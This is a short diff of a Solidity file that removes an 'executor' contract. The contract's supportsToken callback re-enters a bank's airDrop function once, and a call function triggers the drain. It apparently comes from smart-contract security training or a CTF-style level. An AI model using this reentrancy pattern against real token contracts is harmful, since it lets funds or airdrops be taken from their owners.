@@ -27,17 +27,3 @@ contract Bank{
         return(keccak256(abi.encodePacked("Nu Token")));
     }
 }
-
-contract executor {
-    bool hasBeenCalled;
-    function supportsToken() external returns(bytes32){
-        if(!hasBeenCalled){
-            hasBeenCalled = true;
-            ModifierBank(msg.sender).airDrop();
-        }
-        return(keccak256(abi.encodePacked("Nu Token")));
-    }
-    function call(address token) public{
-        ModifierBank(token).airDrop();
-    }
-}
